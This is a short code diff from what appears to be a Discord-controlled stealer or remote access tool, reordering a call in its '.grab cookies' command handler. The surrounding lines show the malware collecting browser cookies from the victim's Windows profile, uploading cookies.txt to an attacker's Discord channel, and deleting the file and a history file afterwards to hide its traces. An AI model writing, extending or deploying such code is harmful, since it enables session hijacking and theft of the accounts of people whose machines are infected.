@@ -30,8 +30,8 @@ elif message.content[:5] == '.grab':
             subprocess.run('del history.txt', shell=True)
         
         elif message.content[6:] == 'cookies':
-            grab_cookies()
             await message.channel.send('```Grabbing cookies. Please wait...```')
+            grab_cookies()
             await asyncio.sleep(1)
             reaction_msg = await client.get_channel(channel_ids['main']).send('```Grabbed cookies```', file=discord.File(f'C:\\Users\\{getuser()}\\cookies.txt', filename='cookies.txt')); await reaction_msg.add_reaction('📌')
             subprocess.run(f'del C:\\Users\\{getuser()}\\cookies.txt', shell=True)
